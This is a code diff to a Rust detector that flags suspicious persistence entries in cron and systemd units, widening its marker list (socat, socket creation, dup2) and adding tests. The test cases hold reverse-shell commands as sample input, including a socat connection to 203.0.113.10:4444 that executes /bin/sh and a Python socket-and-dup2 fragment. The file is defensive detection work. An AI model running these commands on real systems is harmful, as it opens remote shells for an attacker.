@@ -127,11 +127,15 @@ pub fn is_persistence_command_candidate(line: &str) -> bool {
         "wget ",
         "| sh",
         "| bash",
-        "bash -c",
         "base64",
         "/dev/tcp/",
         "nc -e",
         "socat",
+        "exec:",
+        "system:",
+        "socket.socket",
+        "socket_create",
+        "dup2",
     ]
     .iter()
     .any(|marker| lowered.contains(marker))
@@ -148,10 +152,16 @@ mod tests {
         ));
         assert!(is_persistence_command_candidate("@reboot /dev/shm/.x"));
         assert!(is_persistence_command_candidate(
-            "ExecStart=/bin/bash -c 'read args <&3; echo args=$args'"
+            "ExecStart=socat TCP:203.0.113.10:4444 EXEC:/bin/sh,pty"
+        ));
+        assert!(is_persistence_command_candidate(
+            "ExecStart=python3 -c 'import socket,os; s=socket.socket(); os.dup2(s.fileno(),0)'"
         ));
         assert!(!is_persistence_command_candidate(
             "0 1 * * * /usr/bin/certbot renew"
+        ));
+        assert!(!is_persistence_command_candidate(
+            "ExecStart=/bin/bash -c 'read args <&3; echo args=$args'"
         ));
     }
 }
